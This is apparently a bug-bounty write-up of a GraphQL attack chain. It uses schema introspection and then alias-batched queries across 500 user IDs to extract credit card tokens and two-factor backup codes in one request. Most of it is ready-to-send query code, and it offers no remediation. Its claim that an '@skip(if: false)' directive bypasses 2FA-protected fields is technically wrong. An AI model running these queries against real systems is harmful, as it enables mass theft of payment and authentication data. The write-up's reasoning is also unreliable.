The overlooked low bug

    GraphQL endpoint has introspection enabled → programs often say "low, just schema info"

    No rate limiting on batch queries

The chaining enabler

    GraphQL aliases allow asking for same field multiple times with different arguments

    Debit/Credit card fields are marked @deprecated but still functional

Advanced chain
Step 1 – Introspection to find deprecated fields
graphql

query {
  __type(name: "User") {
    fields {
      name
      isDeprecated
      deprecationReason
    }
  }
}

Response shows:
json

"name": "paymentMethods", "isDeprecated": true
"name": "creditCardToken", "isDeprecated": true

Step 2 – Batch alias attack to paginate without pagination limits
graphql

query {
  user1: user(id: 1) { creditCardToken }
  user2: user(id: 2) { creditCardToken }
  user3: user(id: 3) { creditCardToken }
  # ... repeat 500 times
  user500: user(id: 500) { creditCardToken }
}

Step 3 – Use batch + nested aliases to bypass 2FA-protected fields
graphql

query {
  user1: user(id: 1) {
    twoFactorBackupCodes @skip(if: false) {
      code
    }
  }
  # ... 500 times
}

Why P1: Full database of credit cards + backup codes in one request.

Real-world example: Shopify's 2019 GraphQL batch vulnerability (though they fixed quickly).
